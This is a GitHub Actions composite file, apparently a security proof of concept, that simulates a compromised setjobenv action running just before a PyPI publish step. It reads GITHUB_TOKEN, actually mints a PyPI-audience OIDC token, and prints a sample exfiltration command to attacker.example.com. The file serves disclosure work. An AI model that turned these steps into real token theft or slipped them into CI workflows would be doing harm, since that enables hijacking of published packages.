name: 'evil-setjobenv (PoC only - do not deploy)'
description: |
  Security PoC simulating a compromised Chia-Network/actions/setjobenv@main.
  Demonstrates that arbitrary code in a @main-pinned action executes in the
  upload job context with access to GITHUB_TOKEN and the OIDC token endpoint
  immediately before pypa/gh-action-pypi-publish runs.
  
  This action logs token metadata to stdout only.
  No data is sent to external infrastructure.

inputs:
  GH_TOKEN:
    description: 'GitHub token passed by the workflow (mirrors real setjobenv interface)'
    required: false

runs:
  using: composite
  steps:
    - name: '[PoC] Simulate legitimate setjobenv work'
      shell: bash
      run: |
        # Real setjobenv parses the event and sets RELEASE/PRE_RELEASE env vars.
        # A compromised version would do this AND the steps below.
        echo "Parsing GitHub event context..."
        echo "github.event_name=${{ github.event_name }}"

    - name: '[PoC] Demonstrate GITHUB_TOKEN accessibility'
      shell: bash
      env:
        GH_TOKEN: ${{ inputs.GH_TOKEN }}
      run: |
        echo "================================================================"
        echo "  SECURITY POC — GITHUB_TOKEN accessible in action context"
        echo "================================================================"
        echo ""
        echo "  Token length   : ${#GH_TOKEN}"
        echo "  Token prefix   : ${GH_TOKEN:0:4}..."
        echo ""
        echo "  In a real supply chain attack, this token would be exfiltrated"
        echo "  to attacker infrastructure via:"
        echo "    curl -s https://attacker.example.com/collect \\"
        echo "      -d \"token=\${GH_TOKEN}\""
        echo ""
        echo "  GITHUB_TOKEN scope at this job:"
        echo "    contents : read"
        echo "    id-token : write   <-- OIDC minting enabled workflow-wide"
        echo "================================================================"

    - name: '[PoC] Demonstrate OIDC token endpoint accessibility'
      shell: bash
      run: |
        echo "================================================================"
        echo "  SECURITY POC — OIDC endpoint reachable in action context"
        echo "================================================================"
        echo ""
        echo "  ACTIONS_ID_TOKEN_REQUEST_URL present:"
        if [[ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]]; then
          echo "    YES — endpoint: ${ACTIONS_ID_TOKEN_REQUEST_URL:0:60}..."
        else
          echo "    NO  — id-token:write not granted to this job"
        fi
        echo ""
        echo "  ACTIONS_ID_TOKEN_REQUEST_TOKEN present:"
        if [[ -n "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" ]]; then
          echo "    YES — bearer token length: ${#ACTIONS_ID_TOKEN_REQUEST_TOKEN}"
        else
          echo "    NO"
        fi
        echo ""

    - name: '[PoC] Request OIDC token for PyPI audience (proves minting capability)'
      shell: bash
      run: |
        echo "================================================================"
        echo "  SECURITY POC — OIDC token mint attempt (audience=pypi)"
        echo "================================================================"
        echo ""
        if [[ -z "$ACTIONS_ID_TOKEN_REQUEST_URL" ]]; then
          echo "  SKIP — OIDC endpoint not available in this job context."
          echo "  Ensure id-token: write is set at workflow or job level."
          exit 0
        fi

        echo "  Requesting OIDC token for audience=pypi..."
        RESPONSE=$(curl -s \
          -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
          "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=pypi")

        # Extract JWT without logging the full token
        JWT=$(echo "$RESPONSE" | python3 -c \
          'import sys,json; d=json.load(sys.stdin); print(d.get("value","ERROR"))' \
          2>/dev/null || echo "PARSE_ERROR")

        if [[ "$JWT" == "ERROR" ]] || [[ "$JWT" == "PARSE_ERROR" ]]; then
          echo "  OIDC request failed or unparseable. Raw response (first 120 chars):"
          echo "  ${RESPONSE:0:120}"
        else
          echo "  OIDC token obtained successfully."
          echo "  JWT prefix (first 20 chars): ${JWT:0:20}..."
          echo "  JWT length: ${#JWT}"
          echo ""
          echo "  This token is accepted by PyPI's trusted publisher endpoint."
          echo "  In a real attack, this token would be used to authenticate"
          echo "  'cargo publish' / 'twine upload' against PyPI directly."
          echo ""
          echo "  Token is short-lived (~5 min). Not usable after this run."
        fi
        echo "================================================================"

    - name: '[PoC] Show execution position relative to publish step'
      shell: bash
      run: |
        echo "================================================================"
        echo "  SECURITY POC — Execution order confirmation"
        echo "================================================================"
        echo ""
        echo "  This action ran at the setjobenv position in the upload job."
        echo "  The next step after this action is pypa/gh-action-pypi-publish."
        echo ""
        echo "  Full execution context available to attacker at this point:"
        echo "    Working directory : $(pwd)"
        echo "    Runner OS         : $RUNNER_OS"
        echo "    Runner arch       : $RUNNER_ARCH"
        echo "    Repo              : $GITHUB_REPOSITORY"
        echo "    Ref               : $GITHUB_REF"
        echo "    SHA               : $GITHUB_SHA"
        echo "    Actor             : $GITHUB_ACTOR"
        echo "    Run ID            : $GITHUB_RUN_ID"
        echo ""
        echo "  ./dist/ contents (wheels staged for publish):"
        if [[ -d "./dist" ]]; then
          ls -la ./dist/
        else
          echo "    (dist not yet populated at this step — artifact download"
          echo "     runs after setjobenv in the real workflow)"
        fi
        echo "================================================================"
